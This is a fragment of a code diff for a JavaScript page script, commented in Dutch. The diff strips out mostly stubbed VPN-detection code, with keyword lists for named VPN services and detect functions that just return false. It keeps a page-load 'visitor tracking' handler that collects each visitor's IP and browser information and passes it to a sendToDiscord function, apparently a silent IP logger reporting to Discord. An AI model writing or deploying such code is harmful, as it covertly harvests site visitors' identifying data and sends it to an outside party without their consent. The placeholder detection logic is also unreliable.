-                    return false;
-                }
-            },
-            // ProtonVPN
-            {
-                name: 'ProtonVPN',
-                keywords: ['proton', 'protonvpn', 'switzerland', 'secure core'],
-                detect: () => {
-                    // ProtonVPN heeft vaak specifieke eigenschappen
-                    if (ipInfo.doNotTrack === '1' && ipInfo.webRTCEnabled === false) {
-                        return true;
-                    }
-                    return false;
-                }
-            },
-            // CyberGhost
-            {
-                name: 'CyberGhost',
-                keywords: ['cyber', 'cyberghost', 'romania', 'ghost'],
-                detect: () => {
-                    // CyberGhost heeft vaak specifieke eigenschappen
-                    return false;
-                }
-            },
-            // Private Internet Access
-            {
-                name: 'Private Internet Access',
-                keywords: ['pia', 'private internet access', 'kape'],
-                detect: () => {
-                    // PIA heeft vaak specifieke eigenschappen
-                    return false;
-                }
-            },
-            // Mullvad
-            {
-                name: 'Mullvad',
-                keywords: ['mullvad', 'sweden', 'wireguard'],
-                detect: () => {
-                    // Mullvad heeft vaak specifieke eigenschappen
-                    return false;
-                }
-            }
-        ];
-        
-        // Controleer op VPN-diensten
-        for (const vpnService of vpnServices) {
-            // Controleer op keywords in user agent, vendor en platform
-            for (const keyword of vpnService.keywords) {
-                if (userAgentLower.includes(keyword) || 
-                    vendorLower.includes(keyword) || 
-                    platformLower.includes(keyword)) {
-                    console.log(`${vpnService.name} gedetecteerd via keyword: ${keyword}`);
-                    return { detected: true, vpnName: vpnService.name };
-                }
-            }
-            
-            // Controleer met specifieke detectiefunctie
-            if (vpnService.detect && vpnService.detect()) {
-                console.log(`${vpnService.name} gedetecteerd via specifieke eigenschappen`);
-                return { detected: true, vpnName: vpnService.name };
-            }
-        }
-        
-        return { detected: false, vpnName: null };
-    } catch (error) {
-        console.error('Fout bij detecteren populaire VPN-diensten:', error);
-        return { detected: false, vpnName: null };
     }
 }
 
@@ -811,42 +223,15 @@ document.addEventListener('DOMContentLoaded', async () => {
         console.log('Bezoeker tracking gestart...');
         
         // Haal lokale informatie op
-    const ipInfo = await getIPInfo();
-        console.log('Lokale informatie opgehaald:', ipInfo);
+        const ipInfo = await getIPInfo();
+        console.log('IP-informatie opgehaald:', ipInfo);
         
         // Haal browser-informatie op
-    const browserInfo = getBrowserInfo();
+        const browserInfo = getBrowserInfo();
         console.log('Browser-informatie opgehaald:', browserInfo);
         
-        // Controleer op VPN-gebruik met lokale methoden
-        console.log('Controleren op VPN-gebruik met lokale methoden...');
-    const vpnCheckResult = await checkVPN(ipInfo);
-        console.log('VPN check resultaat:', vpnCheckResult);
-        
-        // Verzamel VPN-informatie
-        const vpnInfo = {
-            isVPN: vpnCheckResult.isVPN,
-            isGoogleVPN: vpnCheckResult.isGoogleVPN || false,
-            vpnName: vpnCheckResult.vpnInfo ? vpnCheckResult.vpnInfo.vpnName : null,
-            ipInfo: ipInfo,
-            browserInfo: browserInfo
-        };
-    
-    // Stuur informatie naar Discord
-    await sendToDiscord(ipInfo, browserInfo, vpnCheckResult.isVPN);
-    
-        // Toon de Google VPN-blokkade als Google VPN is gedetecteerd
-    if (vpnInfo.isGoogleVPN) {
-            console.log('Google VPN gedetecteerd, blokkade wordt getoond...');
-            showVPNPopup(true, vpnInfo); // Toon de Google VPN-blokkade
-    }
-    // Anders toon de normale VPN-popup als een VPN is gedetecteerd
-    else if (vpnInfo.isVPN) {
-            console.log(`VPN gedetecteerd (${vpnInfo.vpnName}), popup wordt getoond...`);
-            showVPNPopup(false, vpnInfo); // Toon de normale VPN-popup
-        } else {
-            console.log('Geen VPN gedetecteerd.');
-        }
+        // Stuur informatie naar Discord
+        await sendToDiscord(ipInfo, browserInfo);
     } catch (error) {
         console.error('Fout bij bezoeker tracking:', error);
     }
